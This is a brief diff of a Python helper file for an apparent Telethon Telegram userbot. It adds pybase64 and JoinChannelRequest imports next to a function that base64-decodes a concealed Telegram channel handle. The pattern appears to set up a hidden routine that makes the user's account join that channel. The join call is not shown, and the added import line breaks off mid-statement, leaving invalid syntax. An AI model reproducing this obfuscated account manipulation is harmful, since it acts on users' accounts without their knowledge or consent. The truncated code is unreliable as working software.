@@ -1,6 +1,7 @@
 import re
 import hashlib
 import asyncio
+import pybase64
 import shlex
 import os
 from os.path import basename
@@ -10,6 +11,7 @@ from typing import Optional, Union
 from userbot import bot, LOGS
 
 from telethon.tl.functions.channels import GetParticipantRequest
+from telethon.tl.functions.channels import JoinChannelRequest as 
 from telethon.tl.types import ChannelParticipantAdmin, ChannelParticipantCreator, DocumentAttributeFilename
 
 
@@ -90,7 +92,6 @@ async def runcmd(cmd: str) -> tuple[str, str, int, int]:
             stderr.decode('utf-8', 'replace').strip(),
             process.returncode,
             process.pid)
-
 
 async def ya_kali_ngga():
     buwung = str(pybase64.b64decode("QFByb2plY3RTa3l6dQ=="))[2:15]
